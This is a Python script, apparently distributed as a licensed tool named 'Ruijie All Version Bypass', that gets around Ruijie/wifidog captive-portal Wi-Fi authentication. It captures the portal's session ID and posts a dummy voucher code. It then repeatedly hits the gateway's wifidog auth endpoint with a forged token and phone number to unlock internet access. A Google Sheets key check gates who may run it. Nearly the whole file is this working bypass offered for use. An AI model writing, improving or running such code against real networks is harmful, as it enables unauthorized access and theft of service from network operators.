import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime, date

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM (Hacker UI)
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================

# Google Sheets CSV Link
SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/1hQIA31FeBIDKXfmyIv8UjDk-ixQEseDy-n7p9oFXphk/export?format=csv"

LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")

def get_system_key():
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys_with_expiry():
    """Fetch authorized keys with expiry dates from Google Sheets"""
    keys_data = {}
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('keys') and not line.startswith('username'):
                    parts = line.split(',')
                    if len(parts) >= 1:
                        key = parts[0].strip().strip('"')
                        if key:
                            # Get expiry date from column C (index 2)
                            expiry = parts[2].strip().strip('"') if len(parts) > 2 else ""
                            keys_data[key] = expiry
            if keys_data:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        for key, expiry in keys_data.items():
                            f.write(f"{key},{expiry}\n")
                except:
                    pass
            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from Google Sheets{RESET}")
            return keys_data
    except Exception as e:
        print(f"{RED}[!] Google Sheets error: {e}{RESET}")
    
    # Try local cache
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(',')
                        if len(parts) >= 1:
                            key = parts[0]
                            expiry = parts[1] if len(parts) > 1 else ""
                            keys_data[key] = expiry
            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from local cache{RESET}")
            return keys_data
    except:
        pass
    
    return {}

def check_approval():
    print(f"{MAGENTA}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    system_key = get_system_key()
    authorized_keys_data = fetch_authorized_keys_with_expiry()
    
    print(f"{WHITE}[*] System Key: {GREEN}{system_key}{RESET}")
    print(f"{WHITE}[*] Authorized Keys: {GREEN}{len(authorized_keys_data)}{RESET}")
    
    if system_key in authorized_keys_data:
        expiry_date_str = authorized_keys_data[system_key]
        
        # Check if key has expiry date
        if expiry_date_str:
            try:
                # Parse expiry date (format: YYYY-MM-DD)
                expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
                today = date.today()
                
                if today > expiry_date:
                    print(f"\n{RED}[✗] KEY EXPIRED!{RESET}")
                    print(f"{YELLOW}Expiry date: {expiry_date_str}{RESET}")
                    return False
                else:
                    days_left = (expiry_date - today).days
                    print(f"\n{GREEN}[✓] KEY APPROVED ✓{RESET}")
                    print(f"{GREEN}    Expires: {expiry_date_str} ({days_left} days left){RESET}")
                    print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
                    time.sleep(1.5)
                    return True
            except Exception as e:
                print(f"\n{YELLOW}[!] Date parsing error: {e}{RESET}")
                print(f"{GREEN}[✓] KEY APPROVED (No expiry check){RESET}")
                time.sleep(1.5)
                return True
        else:
            # No expiry date (Lifetime)
            print(f"\n{GREEN}[✓] KEY APPROVED (Lifetime){RESET}")
            print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
            time.sleep(1.5)
            return True
    else:
        print(f"\n{RED}[✗] KEY NOT APPROVED{RESET}")
        print(f"{YELLOW}Add '{system_key}' to Column A in Google Sheets{RESET}")
        return False

# ===============================
# CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# LOGGING
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

# ===============================
# INTERNET CHECK
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

# ===============================
# HACKER BANNER
# ===============================
def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║        Ruijie All Version Bypass     ║
║        Pro Terminal Edition          ║
╚══════════════════════════════════════╝
{RESET}""")

# ===============================
# HIGH SPEED PING THREAD
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
        except:
            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN PROCESS
# ===============================
def start_process():
    banner()
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")

            # STEP 1 - Extract SID
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                logging.warning(f"{RED}Session ID Not Found{RESET}")
                time.sleep(5)
                continue

            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")

            # STEP 2 - Optional Voucher Test
            print(f"{CYAN}[*] Checking Voucher Endpoint...{RESET}")
            voucher_api = f"{portal_host}/api/auth/voucher/"

            try:
                v_res = session.post(
                    voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                    timeout=5
                )
                print(f"{GREEN}[✓]{RESET} Voucher API Status: {v_res.status_code}")
            except:
                print(f"{YELLOW}[!]{RESET} Voucher Endpoint Skipped")

            # STEP 3 - Build Auth Link
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(
                    target=high_speed_ping,
                    args=(auth_link, sid),
                    daemon=True
                ).start()

            while check_real_internet():
                time.sleep(5)

        except Exception as e:
            if DEBUG:
                logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(5)

# ===============================
# ENTRY POINT WITH APPROVAL
# ===============================
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{GREEN}Your System Key: {get_system_key()}{RESET}")
        print(f"{YELLOW}Add this key to Column A in Google Sheets{RESET}")
        sys.exit(0)
    
    if check_approval():
        try:
            start_process()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
    else:
        sys.exit(1)
